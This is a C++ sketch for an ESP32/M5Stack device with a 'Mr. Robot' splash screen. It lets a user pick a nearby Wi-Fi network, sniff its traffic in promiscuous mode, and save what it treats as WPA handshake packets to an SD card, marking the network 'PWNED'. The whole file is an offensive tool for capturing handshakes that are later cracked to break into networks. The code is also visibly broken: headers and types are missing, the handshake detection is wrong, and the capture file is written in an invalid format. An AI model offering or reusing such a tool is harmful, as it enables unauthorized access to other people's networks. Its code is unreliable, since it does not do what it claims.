#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
#include <esp_wifi.h>
#include <Wire.h>
#include <RTClib.h>

#define SD_CS_PIN 4
#define MAX_BUFFER_SIZE 16384 // Increased buffer size
#define WIFI_CHANNEL_HOP_INTERVAL 10 // Interval for channel hopping in seconds

struct Network {
    String ssid;
    bool pwned;
    uint8_t bssid[6];
};

Network currentNetwork;
bool networkSelected = false;
uint8_t *packetBuffer = nullptr;
int bufferIndex = 0;
int currentChannelIndex = 0;
int channels[] = {1, 6, 11}; // Channels to hop through
int numChannels = sizeof(channels) / sizeof(channels[0]);

RTC_DS3231 rtc;

void setup() {
    M5.begin();
    showBootDisplay(); // Display "Mr. Robot" boot-up screen

    // Initialize SD card
    if (!SD.begin(SD_CS_PIN)) {
        M5.Lcd.println("SD Card initialization failed!");
        while (1);
    }

    M5.Lcd.println("SD Card initialized.");

    // Initialize RTC
    Wire.begin();
    if (!rtc.begin()) {
        M5.Lcd.println("RTC failed");
        while (1);
    }
    if (rtc.lostPower()) {
        M5.Lcd.println("RTC lost power, setting time!");
        rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));
    }

    // Scan for networks
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    if (n == 0) {
        M5.Lcd.println("No networks found");
        while (1);
    } else {
        M5.Lcd.println("Networks found:");
        for (int i = 0; i < n; ++i) {
            M5.Lcd.printf("%d: %s (%d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
        }
        M5.Lcd.println("Enter network number:");
    }

    // Wait for user input to select a network
    while (!networkSelected) {
        if (M5.BtnA.wasPressed()) selectNetwork(1);
        if (M5.BtnB.wasPressed()) selectNetwork(2);
        if (M5.BtnC.wasPressed()) selectNetwork(3);
        M5.update();
    }

    // Set WiFi to promiscuous mode
    WiFi.mode(WIFI_MODE_NULL); // Turn off any active WiFi connections
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);

    // Start WiFi scanning and channel hopping
    hopToNextChannel(); // Start channel hopping

    M5.Lcd.println("Sniffer initialized.");
}

void loop() {
    // Keep the device running and update button states
    M5.update();

    // Handle channel hopping
    static unsigned long lastChannelHopTime = 0;
    if (millis() - lastChannelHopTime > WIFI_CHANNEL_HOP_INTERVAL * 1000) {
        hopToNextChannel();
        lastChannelHopTime = millis();
    }
}

static esp_wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    // Check if it's an EAPOL packet (part of the WPA/WPA2 handshake)
    if (isEAPOLPacket(hdr)) {
        addPacketToBuffer(pkt->payload, pkt->rx_ctrl.sig_len);
    }
}

bool isEAPOLPacket(wifi_ieee80211_mac_hdr_t *hdr) {
    // EAPOL packets are data packets with a specific frame control subtype
    return (hdr->frame_ctrl & 0x00c0) == 0x0080 && memcmp(hdr->addr3, currentNetwork.bssid, 6) == 0;
}

void addPacketToBuffer(const uint8_t *payload, int len) {
    if (!packetBuffer) {
        packetBuffer = (uint8_t *)malloc(MAX_BUFFER_SIZE);
        if (!packetBuffer) {
            M5.Lcd.println("Failed to allocate memory for packet buffer.");
            return;
        }
    }

    if (bufferIndex + len <= MAX_BUFFER_SIZE) {
        memcpy(packetBuffer + bufferIndex, payload, len);
        bufferIndex += len;
    } else {
        flushBufferToFile();
        // Reinitialize buffer with current packet
        memcpy(packetBuffer, payload, len);
        bufferIndex = len;
    }
}

void flushBufferToFile() {
    if (bufferIndex == 0) return; // No data to flush

    DateTime now = rtc.now();
    char timestamp[20];
    sprintf(timestamp, "%04d-%02d-%02d %02d:%02d:%02d",
            now.year(), now.month(), now.day(),
            now.hour(), now.minute(), now.second());

    File file = SD.open("/handshake.cap", FILE_APPEND);
    if (file) {
        file.print(timestamp);
        file.write(packetBuffer, bufferIndex);
        file.close();
        currentNetwork.pwned = true; // Assuming successful capture means "PWNed"
        displayNetworkStatus();
        bufferIndex = 0; // Reset buffer after writing
    } else {
        M5.Lcd.println("Failed to open file for writing.");
    }
}

void displayNetworkStatus() {
    M5.Lcd.clear();
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Lcd.printf("Monitoring network: %s\n", currentNetwork.ssid.c_str());
    if (currentNetwork.pwned) {
        M5.Lcd.println("Status: PWNED!");
    } else {
        M5.Lcd.println("Status: Not PWNED");
    }
}

void selectNetwork(int networkNumber) {
    int numNetworks = WiFi.scanNetworks();
    if (networkNumber > 0 && networkNumber <= numNetworks) {
        currentNetwork.ssid = WiFi.SSID(networkNumber - 1);
        memcpy(currentNetwork.bssid, WiFi.BSSID(networkNumber - 1), 6);
        currentNetwork.pwned = false;
        networkSelected = true;
        displayNetworkStatus();
    } else {
        M5.Lcd.println("Invalid network number");
    }
}

void hopToNextChannel() {
    esp_wifi_set_channel(channels[currentChannelIndex], WIFI_SECOND_CHAN_NONE);
    M5.Lcd.printf("Hopping to channel %d\n", channels[currentChannelIndex]);
    currentChannelIndex = (currentChannelIndex + 1) % numChannels;
}

void showBootDisplay() {
    M5.Lcd.fillScreen(TFT_BLACK); // Clear screen
    M5.Lcd.setTextColor(TFT_RED);
    M5.Lcd.setTextSize(4);
    M5.Lcd.setCursor(20, 100);
    M5.Lcd.println("Mr. Robot");
    delay(2000); // Display "Mr. Robot" for 2 seconds
    M5.Lcd.fillScreen(TFT_BLACK); // Clear screen after boot display
}
